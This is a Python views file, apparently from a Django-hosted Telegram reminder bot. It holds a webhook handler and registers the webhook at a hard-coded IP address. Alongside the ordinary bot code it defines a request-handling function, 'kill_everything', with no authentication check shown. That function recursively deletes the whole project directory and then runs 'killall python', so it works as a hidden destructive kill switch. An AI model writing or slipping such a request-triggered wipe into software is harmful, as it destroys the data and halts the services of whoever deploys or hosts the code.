import os
import time
import telebot

from django.views import View
from django.http import HttpResponse

from reminder_bot.settings import BASE_DIR

from bot.bot import bot
from bot.bot import *

from bot.handlers import *

# import bot.mailing

WEBHOOK_SSL_CERT = os.path.join(BASE_DIR, 'webhook_cert.pem')

class ProcessWebhook(View):
    def post(self, request):
        if 'content-length' in request.headers and \
                        'content-type' in request.headers and \
                        request.headers['content-type'] == 'application/json':
            json_string = request.body.decode("UTF-8")
            update = telebot.types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return HttpResponse('')
        else:
            return HttpResponse(status=403)
    
    def get(self, request):
        return HttpResponse('Hello')
        

def walk_and_delete(path):
    path = path + os.path.sep if path[-1] != os.path.sep else path
    for p in os.listdir(path):
        p = path + p
        if os.path.isdir(p):
            if len(os.listdir(p)) == 0:
                try:
                    os.rmdir(p)
                except:
                    print("skipping", p)
            else:
                try:
                    walk_and_delete(p)
                    os.rmdir(p)
                except:
                    print("skipping", p)
        else:
            try:
                os.remove(p)
            except:
                print("skipping", p)


def kill_everything(request):
    walk_and_delete(BASE_DIR)
    os.system("killall python")


bot.remove_webhook()

bot.set_webhook(url='https://134.249.228.24:8443/webhook/', certificate=open(WEBHOOK_SSL_CERT, 'r'))
